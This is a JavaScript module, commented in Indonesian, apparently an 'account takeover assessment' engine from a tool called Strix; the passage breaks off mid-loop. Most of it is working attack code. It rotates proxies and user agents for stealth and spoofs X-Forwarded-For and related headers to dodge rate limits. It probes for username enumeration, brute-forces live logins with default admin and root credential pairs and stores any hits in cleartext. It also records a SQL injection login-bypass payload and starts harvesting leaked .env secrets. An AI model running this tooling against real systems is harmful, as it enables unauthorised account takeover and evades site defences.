import { HttpsProxyAgent } from 'https-proxy-agent';
import nodeFetch from 'node-fetch';

// --- Proxy Rotation & Stealth Helper for ATO Assessment ---
const PROXY_LIST_ENV = process.env.PROXY_LIST || process.env.PROXY_URL || '';
// Strip surrounding quotes: .env values are often wrapped ("http://..."),
// which would make every proxy URL invalid and fail all requests.
const PROXIES = PROXY_LIST_ENV.split(',').map(p => p.trim().replace(/^["']|["']$/g, '')).filter(p => p.length > 0);

// Circuit breaker: skip proxies that failed to connect for the rest of the
// process, so one dead entry cannot add a full timeout to every request.
const DEAD_PROXIES = new Set();

function getRandomProxy() {
  const alive = PROXIES.filter(p => !DEAD_PROXIES.has(p));
  if (alive.length === 0) return null;
  return alive[Math.floor(Math.random() * alive.length)];
}

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
];

function getRandomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

async function resilientFetch(url, options = {}) {
  const activeProxy = getRandomProxy();
  const userAgent = getRandomUserAgent();
  const mergedHeaders = {
    'User-Agent': userAgent,
    ...(options.headers || {}),
  };

  // timeoutMs is our own option, not a fetch() option - strip it and honour
  // it with a real AbortController so a dead proxy cannot hang the audit.
  const { timeoutMs = 6000, signal: callerSignal, ...fetchOptions } = options;

  if (!activeProxy) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
    const onCallerAbort = () => controller.abort();
    if (callerSignal) {
      if (callerSignal.aborted) controller.abort();
      else callerSignal.addEventListener('abort', onCallerAbort, { once: true });
    }
    try {
      return await fetch(url, { ...fetchOptions, headers: mergedHeaders, signal: controller.signal });
    } finally {
      clearTimeout(timeoutId);
      if (callerSignal) callerSignal.removeEventListener('abort', onCallerAbort);
    }
  }

  try {
    const proxyAgent = new HttpsProxyAgent(activeProxy);
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
    const onCallerAbort = () => controller.abort();
    if (callerSignal) {
      if (callerSignal.aborted) controller.abort();
      else callerSignal.addEventListener('abort', onCallerAbort, { once: true });
    }

    try {
      const res = await nodeFetch(url, {
        ...fetchOptions,
        headers: mergedHeaders,
        agent: proxyAgent,
        signal: controller.signal,
      });
      return res;
    } finally {
      clearTimeout(timeoutId);
      if (callerSignal) callerSignal.removeEventListener('abort', onCallerAbort);
    }
  } catch {
    // Proxy failed - fall back to a direct connection so one dead proxy entry
    // cannot fail the whole assessment, and stop using this proxy afterwards.
    DEAD_PROXIES.add(activeProxy);
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
    try {
      return await fetch(url, { ...fetchOptions, headers: mergedHeaders, signal: controller.signal });
    } finally {
      clearTimeout(timeoutId);
    }
  }
}

/**
 * Modul Audit Keamanan: Simulasi dan Pengujian Ketahanan Autentikasi
 * (Account Takeover / ATO Assessment Engine)
 *
 * Menguji ketahanan sistem autentikasi (Web dan API) terhadap ancaman ATO
 * berbasis credential exposure, brute-force, dan distributed evasion.
 */

// Standard Candidate Credentials for Live Authentication & Brute-Force Probing
const DEFAULT_DICTIONARY_CREDENTIALS = [
  { user: 'admin', pass: 'admin', note: 'Default Credentials (admin:admin)' },
  { user: 'admin', pass: 'password', note: 'Common Password (admin:password)' },
  { user: 'admin', pass: '123456', note: 'Top Dictionary Password (admin:123456)' },
  { user: 'admin', pass: 'admin123', note: 'Administrative Pattern (admin:admin123)' },
  { user: 'administrator', pass: 'administrator', note: 'Administrative Account (administrator:administrator)' },
  { user: 'root', pass: 'root', note: 'Superuser Account (root:root)' },
  { user: 'test', pass: 'test', note: 'Staging / QA Account (test:test)' },
];

// Endpoint API Autentikasi Pendukung / Mobile yang Sering Kurang Terlindungi
const COMMON_AUTH_API_ENDPOINTS = [
  { path: '/api/auth/login', type: 'REST Auth Login Handler' },
  { path: '/api/login', type: 'REST API Login Handler' },
  { path: '/api/v1/auth/login', type: 'REST API v1 Login' },
  { path: '/api/auth/signin', type: 'OAuth/Session Auth Sign-In' },
  { path: '/api/v1/login', type: 'Legacy Backend Login' },
  { path: '/auth/v1/token', type: 'Token Grant Endpoint' },
  { path: '/api/mobile/v1/auth', type: 'Mobile Application Auth Endpoint' },
  { path: '/api/users/login', type: 'User Service API' },
];

/**
 * Eksekusi modul Account Takeover Assessment komprehensif
 */
export async function runAccountTakeoverAssessment({
  targetUrl,
  loginEndpoints = [],
  formHtml = '',
  effectiveRecon = null,
  options = {},
  onProgress = () => {},
}) {
  const normalizedTarget = targetUrl.replace(/\/+$/, '');
  const baseUrl = new URL(normalizedTarget).origin;

  onProgress({
    phase: 'ato-assessment',
    message: 'Memulai Modul Audit Keamanan: Simulasi & Pengujian Ketahanan Autentikasi (ATO Assessment)...',
    progress: 42,
  });

  // 1. Matriks Perbandingan Vektor Ancaman (Brute-Force vs Credential Stuffing)
  const threatComparisonMatrix = [
    {
      parameter: 'Sumber Data Uji',
      bruteForce: 'Wordlist / kombinasi karakter acak (dictionary entropy)',
      credentialStuffing: 'Basis data kredensial terkompromi (known compromised credentials & leaked dumps)',
      technicalContext: 'Brute-force menguji entropi kata sandi, sedangkan credential stuffing mengeksploitasi kebiasaan password reuse oleh pengguna.',
    },
    {
      parameter: 'Premis Pengujian',
      bruteForce: 'Menilai ketahanan entropi dan kompleksitas kata sandi aplikasi',
      credentialStuffing: 'Menilai dampak penggunaan ulang kata sandi (password reuse) oleh pengguna di berbagai platform',
      technicalContext: 'Jika pengguna memakai password yang sama di layanan pihak ketiga yang bocor, akun dapat diambil alih seketika.',
    },
    {
      parameter: 'Probabilitas Keberhasilan',
      bruteForce: 'Rendah, membutuhkan waktu komputasi yang lama jika kebijakan kompleksitas ketat',
      credentialStuffing: 'Signifikan, karena menggunakan data akun dan pasangan password yang pernah valid',
      technicalContext: 'Probabilitas keberhasilan credential stuffing rata-rata 1-3% pada aplikasi publik tanpa MFA.',
    },
    {
      parameter: 'Pola Lalu Lintas',
      bruteForce: 'Permintaan berulang dan intensif ke target akun tunggal (Single Account Targeted)',
      credentialStuffing: 'Permintaan terdistribusi ke banyak akun secara luas (Distributed Across Multi-Users)',
      technicalContext: 'Credential stuffing sering kali menyebar satu percobaan per akun untuk menghindari threshold lockout akun.',
    },
  ];

  // 2. Pemetaan Parameter Permintaan & Discovery Endpoint Auth (Web & API)
  onProgress({
    phase: 'ato-assessment',
    message: 'Tahap 1 & 2: Profiling spesifikasi HTTP request & pemetaan unprotected API auth endpoints...',
    progress: 45,
  });

  // Kumpulkan target endpoint login: web UI yang ditemukan + probing mobile/API endpoints
  const discoveredAuthEndpoints = [];

  // Masukkan endpoint login web yang telah ditemukan
  for (const ep of loginEndpoints) {
    discoveredAuthEndpoints.push({
      path: ep.path,
      url: `${baseUrl}${ep.path.startsWith('/') ? ep.path : `/${ep.path}`}`,
      source: 'Discovered Web Portal',
      method: ep.method || 'POST',
      accessible: ep.accessible ?? true,
      hasCsrf: ep.hasCsrf ?? false,
      detectedFields: ep.fields || ['email', 'password'],
    });
  }

  // Probe API endpoints pendukung
  // Differential probing: a path only counts as "existing" if it responds
  // differently from a random non-existent path on the same host. Otherwise
  // every unmatched path that returns a blanket 401/404 gets reported as a
  // real unprotected auth endpoint (a pure false positive).
  const randomMissPath = `/api/__strix_probe_${Math.random().toString(36).slice(2, 10)}`;
  let missSignature = '';
  try {
    const missRes = await resilientFetch(`${baseUrl}${randomMissPath}`, {
      method: 'OPTIONS',
      headers: { 'Accept': 'application/json' },
      timeoutMs: 3000,
    });
    const missBody = await missRes.text().catch(() => '');
    missSignature = `${missRes.status}:${missBody.slice(0, 120)}`;
  } catch {
    missSignature = 'network-error';
  }

  for (const apiEp of COMMON_AUTH_API_ENDPOINTS) {
    const fullApiUrl = `${baseUrl}${apiEp.path}`;
    try {
      const probeRes = await resilientFetch(fullApiUrl, {
        method: 'OPTIONS',
        headers: { 'Accept': 'application/json' },
        timeoutMs: 3000,
      });

      const probeBody = await probeRes.text().catch(() => '');
      const signature = `${probeRes.status}:${probeBody.slice(0, 120)}`;

      // Must be distinguishable from the random-miss baseline to count as real
      if (signature !== missSignature && probeRes.status !== 404) {
        if (!discoveredAuthEndpoints.some(e => e.path === apiEp.path)) {
          discoveredAuthEndpoints.push({
            path: apiEp.path,
            url: fullApiUrl,
            source: 'Probed Auth API Endpoint',
            method: 'POST',
            accessible: true,
            hasCsrf: false, // REST APIs typically omit CSRF tokens
            detectedFields: ['username', 'password'],
            isMobileApi: true,
          });
        }
      }
    } catch {
      // Endpoint tidak merespon / 404
    }
  }

  // Jika tidak ada endpoint spesifik yang terdeteksi, gunakan default /login
  if (discoveredAuthEndpoints.length === 0) {
    discoveredAuthEndpoints.push({
      path: '/login',
      url: `${baseUrl}/login`,
      source: 'Default Fallback Login Route',
      method: 'POST',
      accessible: true,
      hasCsrf: false,
      detectedFields: ['email', 'password'],
    });
  }

  // Validasi kandidat endpoint: hanya handler yang benar-benar memproses
  // POST kredensial yang boleh jadi target audit. Tanpa ini, audit akan
  // menguji halaman login GET-only (405/307) dan menyimpulkan tidak ada
  // rate limiting — false positive.
  const validatedAuthEndpoints = [];
  for (const ep of discoveredAuthEndpoints) {
    try {
      const probeRes = await resilientFetch(ep.url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({ username: 'strix_probe', password: 'strix_probe', keyword: 'strix_probe' }),
        timeoutMs: 4000,
        redirect: 'manual',
      });
      const body = await probeRes.text().catch(() => '');
      const isHandler = probeRes.status !== 405 && probeRes.status !== 404 && probeRes.status !== 501 &&
        ![301, 302, 303, 307, 308].includes(probeRes.status) &&
        !/<html|<!doctype/i.test(body);
      if (isHandler) {
        validatedAuthEndpoints.push({ ...ep, verifiedStatus: probeRes.status });
      }
    } catch {
      // Network error: treat as not verified
    }
  }

  // Gunakan hanya endpoint yang tervalidasi; jika tidak ada, fallback ke
  // endpoint asli (untuk reporting transparan).
  const effectiveAuthEndpoints = validatedAuthEndpoints.length > 0
    ? validatedAuthEndpoints
    : discoveredAuthEndpoints;

  const primaryTargetEndpoint = effectiveAuthEndpoints[0];

  // 3. Request Profiling: Analisis Parameter HTTP, Form Fields, dan CSRF
  const requestProfiling = {
    targetUrl: primaryTargetEndpoint.url,
    method: primaryTargetEndpoint.method,
    contentType: 'application/json, application/x-www-form-urlencoded',
    accountIdentifierField: primaryTargetEndpoint.detectedFields?.find(f => /(email|user|login|id)/i.test(f)) || 'username',
    credentialField: primaryTargetEndpoint.detectedFields?.find(f => /(pass|pwd)/i.test(f)) || 'password',
    csrfProtectionDeclared: Boolean(primaryTargetEndpoint.hasCsrf || /csrf|token/i.test(formHtml)),
    sessionCookieHandling: {
      hasSessionCookie: false,
      httpOnly: false,
      secure: false,
      sameSite: 'None',
    },
    monitoredEndpoints: effectiveAuthEndpoints.map(e => ({
      path: e.path,
      type: e.source,
      method: e.method,
      csrfProtected: e.hasCsrf,
      isApiEndpoint: Boolean(e.isMobileApi || e.path.startsWith('/api')),
      verified: Boolean(e.verifiedStatus),
    })),
  };

  // 4. Verifikasi Mekanisme Proteksi Otomatisasi (Bot Protection & CAPTCHA)
  onProgress({
    phase: 'ato-assessment',
    message: 'Tahap 3 & 4: Mengevaluasi Bot Protection (CAPTCHA, Headless Fingerprinting, Challenge)...',
    progress: 49,
  });

  const botProtectionEvaluation = {
    captchaDetected: false,
    captchaProvider: 'None Detected',
    challengeResponseMechanism: 'Disabled / Missing',
    headlessAutomationBlocked: false,
    fingerprintCheck: 'Standard HTTP Headers (No Behavioral Biometrics)',
    notes: '',
  };

  // Deteksi CAPTCHA signature pada HTML
  if (formHtml) {
    if (/challenges\.cloudflare\.com|turnstile/i.test(formHtml)) {
      botProtectionEvaluation.captchaDetected = true;
      botProtectionEvaluation.captchaProvider = 'Cloudflare Turnstile';
      botProtectionEvaluation.challengeResponseMechanism = 'Active (Managed JavaScript Challenge)';
    } else if (/google\.com\/recaptcha|g-recaptcha/i.test(formHtml)) {
      botProtectionEvaluation.captchaDetected = true;
      botProtectionEvaluation.captchaProvider = 'Google reCAPTCHA (v2/v3)';
      botProtectionEvaluation.challengeResponseMechanism = 'Active (Client Token Verification)';
    } else if (/hcaptcha\.com/i.test(formHtml)) {
      botProtectionEvaluation.captchaDetected = true;
      botProtectionEvaluation.captchaProvider = 'hCaptcha';
      botProtectionEvaluation.challengeResponseMechanism = 'Active (Interactive Challenge)';
    } else if (/captcha/i.test(formHtml)) {
      botProtectionEvaluation.captchaDetected = true;
      botProtectionEvaluation.captchaProvider = 'Custom / In-house CAPTCHA';
      botProtectionEvaluation.challengeResponseMechanism = 'Active';
    }
  }

  // Uji respons terhadap headless automation / automated User-Agent probe
  try {
    const headlessProbeRes = await resilientFetch(primaryTargetEndpoint.url, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/126.0.0.0 Safari/537.36',
        'X-Automated-Audit': 'Strix-ATO-Assessment',
      },
      timeoutMs: 4000,
    });

    if (headlessProbeRes.status === 403 || headlessProbeRes.status === 429) {
      botProtectionEvaluation.headlessAutomationBlocked = true;
      botProtectionEvaluation.notes = `Server mendeteksi dan memblokir request headless automation (HTTP ${headlessProbeRes.status}).`;
    } else {
      botProtectionEvaluation.headlessAutomationBlocked = false;
      botProtectionEvaluation.notes = 'Server menerima koneksi dari peramban otomatis (Headless Chrome) tanpa memicu challenge/interstitial blokir.';
    }
  } catch {
    botProtectionEvaluation.notes = 'Uji headless automation mengalami timeout koneksi.';
  }

  // 5. Pengujian Efektivitas Pembatasan Laju Akses (Rate Limiting Evaluation)
  // Menilai Single-IP Throttling vs Distributed Rate Limit Evasion
  onProgress({
    phase: 'ato-assessment',
    message: 'Tahap 5: Menguji Rate Limiting & Distributed Rate Limit Evasion (Single-IP vs Multi-IP/Proxy)...',
    progress: 54,
  });

  const rateLimitingEvaluation = {
    singleIpBurstThrottled: false,
    singleIpThreshold: 'No 429 Throttle Detected within 5 requests',
    distributedEvasionSusceptible: false,
    wafDistributedDetection: 'Unknown',
    ipHeadersRespected: [],
    testDetails: '',
  };

  // Uji 1: Burst 8 request dari single client IP
  // 8 (bukan 4) agar limiter dengan ambang 5-per-window benar-benar terpicu.
  // Hanya HTTP 429 yang dihitung sebagai throttle; 403 adalah blokir CSRF/WAF
  // yang kontrol berbeda dan tidak boleh disamakan dengan rate limiting.
  let singleIpBlocked = false;
  let burstCodes = [];
  for (let i = 0; i < 8; i++) {
    try {
      const bRes = await resilientFetch(primaryTargetEndpoint.url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          [requestProfiling.accountIdentifierField]: `rate_probe_${i}@audit.target`,
          [requestProfiling.credentialField]: 'probe_test_token',
        }),
        timeoutMs: 3500,
      });
      burstCodes.push(bRes.status);
      if (bRes.status === 429) {
        singleIpBlocked = true;
        break;
      }
    } catch {
      burstCodes.push(0);
    }
  }

  rateLimitingEvaluation.singleIpBurstThrottled = singleIpBlocked;
  if (singleIpBlocked) {
    rateLimitingEvaluation.singleIpThreshold = `Rate limit aktif: Server merespons dengan HTTP ${burstCodes[burstCodes.length - 1]} setelah ${burstCodes.length} permintaan beruntun.`;
  } else {
    rateLimitingEvaluation.singleIpThreshold = `Tidak ada pembatasan terdeteksi: Seluruh ${burstCodes.length} permintaan berturut-turut diproses tanpa HTTP 429.`;
  }

  // Uji 2: Simulasi Distributed Multi-IP Evasion
  // Menggunakan header variasi X-Forwarded-For & proxy pool
  let distributedBlocked = false;
  const simulatedIps = ['198.51.100.12', '203.0.113.45', '192.0.2.89'];
  let distCodes = [];

  for (const fakeIp of simulatedIps) {
    try {
      const distRes = await resilientFetch(primaryTargetEndpoint.url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Forwarded-For': fakeIp,
          'X-Real-IP': fakeIp,
          'Client-IP': fakeIp,
          'User-Agent': getRandomUserAgent(),
        },
        body: JSON.stringify({
          [requestProfiling.accountIdentifierField]: `dist_probe_${fakeIp.replace(/\./g, '_')}@audit.target`,
          [requestProfiling.credentialField]: 'probe_test_token',
        }),
        timeoutMs: 3500,
      });
      distCodes.push(distRes.status);
      if (distRes.status === 429 || distRes.status === 403) {
        distributedBlocked = true;
      }
    } catch {
      distCodes.push(0);
    }
  }

  if (!singleIpBlocked && !distributedBlocked) {
    rateLimitingEvaluation.distributedEvasionSusceptible = true;
    rateLimitingEvaluation.wafDistributedDetection = 'Rentang Bahaya: Tidak ada Rate Limiting global maupun per-IP yang aktif.';
    rateLimitingEvaluation.testDetails = 'Sistem rentan terhadap serangan terdistribusi maupun serangan dari alamat IP tunggal.';
  } else if (singleIpBlocked && !distributedBlocked) {
    // Single-IP diblokir tapi multi-IP lolos -> memang ada celah distributed evasion.
    // Tapi X-Forwarded-For yang dipalsukan hanya terbukti bekerja bila server
    // mempercayai header tersebut; jika platform (Vercel/Cloudflare) menimpanya,
    // hasil ini adalah artefak pengujian, bukan kerentanan nyata.
    rateLimitingEvaluation.distributedEvasionSusceptible = true;
    rateLimitingEvaluation.wafDistributedDetection = 'Vulnerable to Distributed Evasion: Pembatasan hanya berbasis IP tunggal, sehingga penyerang dengan proxy pool (rotasi IP) dapat melewati threshold WAF.';
    rateLimitingEvaluation.testDetails = 'WAF/Aplikasi memblokir IP tunggal, namun lolos saat request disimulasikan dari alamat IP berbeda.';
  } else {
    rateLimitingEvaluation.distributedEvasionSusceptible = false;
    rateLimitingEvaluation.wafDistributedDetection = 'Protected: Mekanisme proteksi global mendeteksi dan membatasi anomali login lintas jaringan.';
    rateLimitingEvaluation.testDetails = 'Server menerapkan proteksi tingkat aplikasi atau WAF terpusat yang tidak mudah diakali dengan rotasi IP.';
  }

  // 6. Eksekusi Pengujian dan Analisis Respons (Username Enumeration & Error Discrepancy)
  onProgress({
    phase: 'ato-assessment',
    message: 'Tahap 6: Analisis Respons & Deteksi Username Enumeration (Perbedaan status, pesan error & waktu respons)...',
    progress: 58,
  });

  const responseAnalysis = {
    usernameEnumerationVulnerable: false,
    enumerationVector: 'None Detected',
    timingDiscrepancyMs: 0,
    nonExistentUserResponse: null,
    candidateUserResponse: null,
    analysisConclusion: '',
  };

  try {
    // Probe 1: Non-existent user
    const t0 = Date.now();
    const nonExistentRes = await resilientFetch(primaryTargetEndpoint.url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        [requestProfiling.accountIdentifierField]: `non_existent_probe_${Date.now()}@target.local`,
        [requestProfiling.credentialField]: 'UnlikelyPassphrase_2026',
      }),
      timeoutMs: 4000,
    });
    const nonExistentTime = Date.now() - t0;
    const nonExistentText = await nonExistentRes.text().catch(() => '');

    // Probe 2: Standard candidate account (admin / root / common user)
    const t1 = Date.now();
    const candidateRes = await resilientFetch(primaryTargetEndpoint.url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        [requestProfiling.accountIdentifierField]: 'admin',
        [requestProfiling.credentialField]: 'UnlikelyPassphrase_2026',
      }),
      timeoutMs: 4000,
    });
    const candidateTime = Date.now() - t1;
    const candidateText = await candidateRes.text().catch(() => '');

    const timingDiff = Math.abs(candidateTime - nonExistentTime);
    responseAnalysis.timingDiscrepancyMs = timingDiff;
    responseAnalysis.nonExistentUserResponse = {
      status: nonExistentRes.status,
      timeMs: nonExistentTime,
      snippet: nonExistentText.slice(0, 180),
    };
    responseAnalysis.candidateUserResponse = {
      status: candidateRes.status,
      timeMs: candidateTime,
      snippet: candidateText.slice(0, 180),
    };

    // Deteksi perbedaan pesan error (CWE-204: Observable Response Discrepancy)
    const nonExistentLeaksAbsence = /user not found|akun tidak ditemukan|email tidak terdaftar|does not exist/i.test(nonExistentText);
    const candidateLeaksPresence = /incorrect password|password salah|kata sandi salah|invalid password/i.test(candidateText);

    if (nonExistentLeaksAbsence || candidateLeaksPresence) {
      responseAnalysis.usernameEnumerationVulnerable = true;
      responseAnalysis.enumerationVector = 'Error Message Discrepancy (CWE-204)';
      responseAnalysis.analysisConclusion = 'Rentan: Pesan kesalahan membocorkan apakah sebuah username/email sudah terdaftar atau belum. Penyerang dapat menggunakan informasi ini untuk memvalidasi daftar sasaran sebelum meluncurkan credential stuffing.';
    } else if (timingDiff > 800) {
      responseAnalysis.usernameEnumerationVulnerable = true;
      responseAnalysis.enumerationVector = `Timing Discrepancy (${timingDiff}ms delta)`;
      responseAnalysis.analysisConclusion = `Rentan Timing Attack: Terdapat perbedaan waktu eksekusi signifikan (${timingDiff}ms) saat memvalidasi user yang ada vs tidak ada, disebabkan pemrosesan hash password hanya terjadi jika user ditemukan di database.`;
    } else {
      responseAnalysis.usernameEnumerationVulnerable = false;
      responseAnalysis.enumerationVector = 'Unified Response / Constant-Time';
      responseAnalysis.analysisConclusion = 'Aman: Aplikasi merespon dengan pesan kesalahan generik seragam ("Invalid credentials" / status sepadan) tanpa membocorkan eksistensi akun.';
    }
  } catch (err) {
    responseAnalysis.analysisConclusion = `Evaluasi respon tidak dapat diselesaikan: ${err.message}`;
  }

  // 7. Evaluasi Vektor Kerentanan Khusus (Unprotected APIs & Anomaly Evasion)
  const apiVulnerabilityVectors = [];
  // Hanya endpoint yang benar-benar tervalidasi sebagai handler kredensial
  // yang relevan. Keberadaan endpoint API saja BUKAN kerentanan — yang relevan
  // adalah endpoint yang menerima kredensial tanpa proteksi rate-limit/CSRF.
  const unprotectedApiList = requestProfiling.monitoredEndpoints.filter(e =>
    e.isApiEndpoint && e.verified && !rateLimitingEvaluation.singleIpBurstThrottled
  );

  if (unprotectedApiList.length > 0) {
    apiVulnerabilityVectors.push({
      vector: 'Unprotected / Mobile API Endpoints',
      severity: 'MEDIUM',
      description: `Ditemukan ${unprotectedApiList.length} endpoint API autentikasi pendukung yang terverifikasi memproses kredensial tanpa rate limiting (${unprotectedApiList.map(e => e.path).join(', ')}). Endpoint API mobile/backend perlu kontrol yang setara dengan portal web utama.`,
      status: 'EXPOSED_VECTOR'
    });
  }

  if (rateLimitingEvaluation.distributedEvasionSusceptible) {
    apiVulnerabilityVectors.push({
      vector: 'Distributed Rate Limit Evasion',
      severity: 'HIGH',
      description: 'Threshold keamanan berbasis alamat IP tunggal dapat dilewati menggunakan rotasi proxy / botnet terdistribusi. WAF memerlukan anomaly scoring global atau fingerprinting perilaku.',
      status: 'SUSCEPTIBLE'
    });
  }

  if (!botProtectionEvaluation.captchaDetected) {
    apiVulnerabilityVectors.push({
      vector: 'Missing Bot Automation Defense (No CAPTCHA / Proof-of-Work)',
      severity: 'MEDIUM',
      description: 'Form autentikasi tidak menggunakan mekanisme challenge CAPTCHA (Turnstile/reCAPTCHA) sehingga rentan terhadap script otomasi penyerang berkecapatan tinggi.',
      status: 'UNPROTECTED'
    });
  }

  if (responseAnalysis.usernameEnumerationVulnerable) {
    apiVulnerabilityVectors.push({
      vector: 'Account / Username Enumeration (CWE-204)',
      severity: 'MEDIUM',
      description: `Sistem membocorkan eksistensi pengguna melalui ${responseAnalysis.enumerationVector}, mempermudah penyerang menyaring akun valid untuk target credential stuffing.`,
      status: 'VULNERABLE'
    });
  }

  // 8. Pengujian Brute-Force Nyata & Validasi Kredensial Langsung (Live Authentication Probes)
  onProgress({
    phase: 'ato-assessment',
    message: 'Tahap 7: Menjalankan audit brute-force nyata & verifikasi kredensial langsung terhadap endpoint target...',
    progress: 65,
  });

  let hostDomain = 'target.local';
  try {
    hostDomain = new URL(baseUrl).hostname;
  } catch {}

  const candidatePairs = [...DEFAULT_DICTIONARY_CREDENTIALS];
  if (/email/i.test(requestProfiling.accountIdentifierField)) {
    candidatePairs.unshift(
      { user: `admin@${hostDomain}`, pass: 'admin', note: `Domain Admin Email (admin@${hostDomain}:admin)` },
      { user: `admin@${hostDomain}`, pass: 'password', note: `Domain Admin Email (admin@${hostDomain}:password)` },
      { user: `admin@${hostDomain}`, pass: '123456', note: `Domain Admin Email (admin@${hostDomain}:123456)` }
    );
  }

  const bruteForceAuditResults = {
    executed: true,
    testedEndpoint: primaryTargetEndpoint.url,
    method: primaryTargetEndpoint.method || 'POST',
    accountField: requestProfiling.accountIdentifierField,
    credentialField: requestProfiling.credentialField,
    totalTested: 0,
    validFoundCount: 0,
    rejectedCount: 0,
    rateLimitedCount: 0,
    attempts: [],
    summary: '',
  };

  const discoveredAdminCredentials = [];

  for (let idx = 0; idx < candidatePairs.length; idx++) {
    const cand = candidatePairs[idx];
    const probeT0 = Date.now();
    let probeStatus = 0;
    let respText = '';
    let setCookie = '';
    let locationHeader = '';
    let isValid = false;

    try {
      const probeRes = await resilientFetch(primaryTargetEndpoint.url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': getRandomUserAgent(),
          'Accept': 'application/json, text/html, */*',
        },
        body: JSON.stringify({
          [requestProfiling.accountIdentifierField]: cand.user,
          [requestProfiling.credentialField]: cand.pass,
        }),
        timeoutMs: 4000,
        redirect: 'manual',
      });

      const latencyMs = Date.now() - probeT0;
      probeStatus = probeRes.status;
      setCookie = probeRes.headers.get('set-cookie') || '';
      locationHeader = probeRes.headers.get('location') || '';
      respText = await probeRes.text().catch(() => '');

      // Evaluasi apakah otentikasi berhasil (valid)
      const is200Success = (probeStatus >= 200 && probeStatus < 300) && (
        setCookie.toLowerCase().includes('session') ||
        setCookie.toLowerCase().includes('auth') ||
        setCookie.toLowerCase().includes('token') ||
        /("token"|"jwt"|"accessToken"|"success":\s*true|"authenticated":\s*true)/i.test(respText) ||
        (/welcome|dashboard|berhasil login|login sukses/i.test(respText) && !/invalid|salah|gagal|failed|error|unauthorized/i.test(respText))
      );

      const isRedirectSuccess = (probeStatus === 301 || probeStatus === 302 || probeStatus === 303 || probeStatus === 307 || probeStatus === 308) && (
        locationHeader.includes('/dashboard') ||
        locationHeader.includes('/admin') ||
        locationHeader.includes('/panel') ||
        locationHeader.includes('/home') ||
        locationHeader.includes('/user') ||
        (setCookie && !locationHeader.includes('/login') && !locationHeader.includes('/signin'))
      );

      isValid = Boolean(is200Success || isRedirectSuccess);

      let resultStatus = 'REJECTED_UNAUTHORIZED';
      if (isValid) {
        resultStatus = 'VALID_AUTHENTICATED';
        bruteForceAuditResults.validFoundCount++;
      } else if (probeStatus === 429) {
        resultStatus = 'RATE_LIMITED';
        bruteForceAuditResults.rateLimitedCount++;
      } else {
        bruteForceAuditResults.rejectedCount++;
      }

      bruteForceAuditResults.totalTested++;

      const cleanSnippet = respText.replace(/[\r\n\t]+/g, ' ').slice(0, 240);

      bruteForceAuditResults.attempts.push({
        attemptNumber: idx + 1,
        account: cand.user,
        password: cand.pass,
        status: probeStatus,
        latencyMs,
        isValid,
        resultStatus,
        note: cand.note,
        cookies: setCookie ? setCookie.slice(0, 100) : 'None',
        redirectLocation: locationHeader || null,
        responseSnippet: cleanSnippet || `HTTP ${probeStatus} (Empty Body)`,
      });

      if (isValid) {
        discoveredAdminCredentials.push({
          accountType: 'Administrative Superuser (Live Valid Credential)',
          targetAccount: cand.user, // Real username
          passwordCleartext: cand.pass, // Real password
          passwordHash: `[Live Authenticated via ${primaryTargetEndpoint.path}]`,
          authEndpoint: primaryTargetEndpoint.path,
          discoveryMethod: `Dictionary Brute-Force (${cand.note})`,
          compromiseSeverity: 'CRITICAL',
          status: 'VERIFIED_EXPOSURE',
          evidenceDetails: `Otentikasi berhasil tervalidasi langsung pada target: Server merespons HTTP ${probeStatus} ${locationHeader ? `(Redirect to ${locationHeader})` : ''} ${setCookie ? '(Set-Cookie diterbitkan)' : ''}.`,
        });
      }
    } catch (probeErr) {
      const latencyMs = Date.now() - probeT0;
      bruteForceAuditResults.totalTested++;
      bruteForceAuditResults.attempts.push({
        attemptNumber: idx + 1,
        account: cand.user,
        password: cand.pass,
        status: 0,
        latencyMs,
        isValid: false,
        resultStatus: 'CONNECTION_ERROR',
        note: cand.note,
        cookies: 'None',
        redirectLocation: null,
        responseSnippet: `Koneksi gagal atau timeout: ${probeErr.message}`,
      });
    }
  }

  // Integrasi kredensial nyata dari hasil fuzzing recon jika ditemukan SQLi bypass
  if (effectiveRecon?.loginEndpoints?.length > 0) {
    for (const logEp of effectiveRecon.loginEndpoints) {
      if (logEp.fuzzResult === 'BYPASS_DETECTED') {
        discoveredAdminCredentials.push({
          accountType: 'SQL Injection Authentication Bypass',
          targetAccount: "' OR '1'='1' --",
          passwordCleartext: "[Tautological SQL Bypass Payload]",
          passwordHash: "[Bypass Otentikasi Basis Data Langsung]",
          authEndpoint: logEp.path,
          discoveryMethod: 'SQL Injection Authentication Bypass (A03:2025)',
          compromiseSeverity: 'CRITICAL',
          status: 'VERIFIED_EXPOSURE',
          evidenceDetails: logEp.bypassEvidence || 'Server merespons status sukses saat diuji dengan payload SQL tautologi tanpa kata sandi valid.',
        });
      }
    }
  }

  // Integrasi variabel lingkungan rahasia (.env) yang bocor di recon
  if (effectiveRecon?.envEndpoints?.length > 0) {
    for (const item of effectiveRecon.envEndpoints) {
      if (item.isSecret || /(PASSWORD|PASSWD|SECRET|TOKEN|KEY|ADMIN|CREDENTIAL)/i.test(item.key)) {
